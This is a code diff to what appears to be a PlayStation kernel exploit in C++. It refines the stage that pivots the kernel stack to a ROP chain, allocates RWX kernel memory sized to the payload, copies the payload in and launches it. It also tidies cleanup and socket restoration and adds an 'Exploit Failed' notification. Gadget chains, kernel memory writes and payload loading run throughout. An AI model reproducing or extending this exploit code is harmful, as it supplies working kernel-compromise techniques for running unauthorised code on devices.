@@ -1473,8 +1473,10 @@ ptr64_t locate_read_ret(ptr64_t kstack, ptr64_t read_ret)
         break;
     }
 
-    if (!ret_p) printf_debug("Failed to locate sys_read() return address!\n");
-    if (!ret_p) return ret_p;
+    if (!ret_p) {
+        printf_debug("Failed to locate sys_read() return address!\n");
+        return ret_p;
+    }
 
     printf_debug("Found sys_read() return address (0x%08x%08x) at 0x%08x%08x\n",
         (uint32_t)(read_ret >> 32), (uint32_t)read_ret,
@@ -1565,20 +1567,6 @@ int32_t run_payload()
 
     ptr64_t chain_p = kstack + 0x3000; // We will write our ROP chain here
 
-    /*
-        TODO:
-        let map_size = patches.size;
-        const max_size = 0x10000000;
-        if (map_size > max_size) {
-            die(`patch file too large (>${max_size}): ${map_size}`);
-        }
-        if (map_size === 0) {
-            die("patch file size is zero");
-        }
-        log(`kpatch size: ${map_size} bytes`);
-        map_size = (map_size + page_size) & -page_size;
-    */
-
     // Writing stack pivot gadgets
     kmemory.write64(ret_p, s2.kernel_base + G_POP_RSP_RET);
     kmemory.write64(ret_p + 8, chain_p);
@@ -1656,7 +1644,7 @@ int32_t run_payload()
     kchain_buf[index++] = s2.kernel_base + G_POP_RDI_RET;
     kchain_buf[index++] = kmemory.read64(s2.kernel_base + K_KERNEL_MAP);
     kchain_buf[index++] = s2.kernel_base + G_POP_RSI_RET;
-    kchain_buf[index++] = PAGE_SIZE;
+    kchain_buf[index++] = ROUND_PG(payload_end - payload_start);
     kchain_buf[index++] = s2.kernel_base + K_KMEM_ALLOC;
 
     // Passing the allocated RWX memory address
@@ -1701,19 +1689,10 @@ int32_t run_payload()
     scePthreadJoin(pthread, 0);
     printf_debug("Thread exited.\n");
 
-    // TODO:
-    // log('mlock exec addr for kernel exec');
-    // sysi('mlock', exec_addr, map_size);
-
     // Copying payload to RWX memory
     kmemory.copyin((void*)payload_start, rwx_p, payload_end - payload_start);
 
-
-    /////////////////////////////////////////////////////////////
-    // Restoring pktopts_p, d_pktopts_p, and launching payload //
-    /////////////////////////////////////////////////////////////
-
-
+    // Restoring pktopts_p, d_pktopts_p, and launching payload
     fds = {-1, -1};
     create_unixpair(&fds);
     fake_buf = 0;
@@ -1798,8 +1777,10 @@ int32_t run_payload()
     return 0;
 }
 
+bool clean = false;
 void cleanup()
 {
+    if (clean) return;
     printf_debug("Cleaning up...\n");
 
     // Close unix socketpair
@@ -1823,34 +1804,18 @@ void cleanup()
     for (uint32_t i = 0; i < NUM_SDS; i++)
         if (s0.sds[i] > 0) PS::close(s0.sds[i]);
 
-    // TODO: reconsider this
-    // Close sd_listen
-    // if (sd_listen > 0) PS::close(sd_listen);
-
-    // Destroy the pthread barrier
-    // if (barrier != 0) scePthreadBarrierDestroy(&barrier);
-
-    // Close rthdr_sds[0]
-    // if (rthdr_sds[0] > 0) PS::close(rthdr_sds[0]);
-
-    // Free evf
-    // if (s2.evf != 0) free_evf(s2.evf);
+    clean = true;
 }
 
 void restore()
 {
-    int64_t e = PS::close(rthdr_sds[0]);
-    printf_debug("Closed rthdr_sds[0]: %ld\n", e);
-    e = PS::close(rthdr_sds[1]);
-    printf_debug("Closed rthdr_sds[1]: %ld\n", e);
-    e = PS::close(pktopts_sds[0]);
-    printf_debug("Closed pktopts_sds[0]: %ld\n", e);
-    e = PS::close(s4.reclaim_sd);
-    printf_debug("Closed reclaim_sd: %ld\n", e);
-    e = PS::close(s4.pipe_fds[0]);
-    printf_debug("Closed pipe_fds[0]: %ld\n", e);
-    e = PS::close(s4.pipe_fds[1]);
-    printf_debug("Closed pipe_fds[1]: %ld\n", e);
+    printf_debug("Closing sockets...\n");
+    PS::close(rthdr_sds[0]);
+    PS::close(rthdr_sds[1]);
+    PS::close(pktopts_sds[0]);
+    PS::close(s4.reclaim_sd);
+    PS::close(s4.pipe_fds[0]);
+    PS::close(s4.pipe_fds[1]);
 }
 
 // overview:
@@ -1903,6 +1868,7 @@ void main()
         {
             cleanup();
             printf_debug("Something went wrong! Error: %d\n", err);
+            PS::notification("Exploit Failed! Please Reboot Your Console!");
             PS::Breakout::restore(); // Restore corruption
         }
         else
